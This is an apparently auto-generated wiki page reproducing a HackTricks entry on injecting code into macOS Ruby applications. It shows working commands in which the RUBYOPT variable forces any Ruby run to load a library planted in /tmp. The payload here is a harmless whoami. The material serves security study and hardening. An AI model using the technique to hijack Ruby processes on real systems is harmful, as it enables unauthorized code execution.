---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# macOS Ruby Applications Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-macos-hardening-macos-security-and-privilege-escalation-macos-proces-abuse-macos-ruby-applications-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ruby-applications-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Using this env variable it's possible to add new params to ruby whenever it gets executed. Although the param -e cannot be used to specify ruby code to execute, it's possible to use the params -I and -r to add a new folder to the libraries

## Preserved Body

````markdown
## RUBYOPT

Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.

Create the library **`inject.rb`** in **`/tmp`**:

```ruby:inject.rb
puts `whoami`
```

Create anywahere a ruby script like:

```ruby:hello.rb
puts 'Hello, World!'
```

Then make an arbitrary ruby script load it with:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Fun fact, it works even with param **`--disable-rubyopt`**:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
````

## Source Verification

[source record](../../sources/hacktricks/macos-ruby-applications-injection.md)

## Evidence Excerpt

````text
_body: '# macOS Ruby Applications Injection
{{#include ../../../banners/hacktricks-training.md}}
## RUBYOPT
Using this env variable it''s possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`**
cannot be used to specify ruby code to execute, it''s possible to use the params **`-I`** and **`-r`** to add a new folder
to the libraries to load path and then **specify a library to load**.
Create the library **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
````
